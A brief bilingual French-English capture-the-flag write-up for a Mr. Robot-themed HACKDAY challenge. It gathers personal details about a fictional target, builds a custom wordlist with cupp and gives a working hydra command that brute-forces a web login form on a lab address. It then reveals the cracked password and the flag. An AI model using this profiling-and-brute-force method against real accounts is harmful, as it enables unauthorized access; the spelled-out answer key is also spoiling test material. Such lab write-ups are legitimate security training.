# Francais

BUT : Trouver le mot de passe de quelqu’un (en créant un dictionnaire) pour se connecter sur son site et trouver le flag.

INFORMATIONS RÉCOLTABLES : 
- theme : MrRobot
- identité : Elliot Alderson
- nom du chien : flipper
- entreprise : Allsafe Security
- date importante : 24 juin 2015
- faux mot de passe : root
- autre date sur le calendrier associer a des photos de personnes

On a généré un dictionnaire avec l’outil cupp qui permet, à partir de réponses à des questions, de faire un dictionnaire personnalisé.
On peut ensuite brute force avec hydra avec la ligne : 

sudo hydra -l admin -P /opt/cupp/alderson.txt 192.168.1.16 http-post-form "/home.php:password=^PASS^:Wrong password"

Le mot de passe est trouvé en environ 10 secondes. 
En se connectant, on a le flag



MOT DE PASSE : Flipper2015
FLAG : HACKDAY{J01N\_FS0C13TY}


# English

PURPOSE: To find someone's password (by creating a dictionary) to log into their site and find the flag.

COLLECTABLE INFORMATION : 
- theme : MrRobot
- identity : Elliot Alderson
- dog's name : flipper
- company : Allsafe Security
- important date : June 24, 2015
- fake password : root
- other date on the calendar associated with photos of people

We generated a dictionary with the cupp tool which allows, from answers to questions, to make a custom dictionary.
We can then brute force with hydra with the line : 

sudo hydra -l admin -P /opt/cupp/alderson.txt 192.168.1.16 http-post-form "/home.php:password=^PASS^:Wrong password"

The password is found in about 10 seconds. 
When connecting, we have the flag



PASSWORD : Flipper2015
FLAG : HACKDAY{J01N\_FS0C13TY}
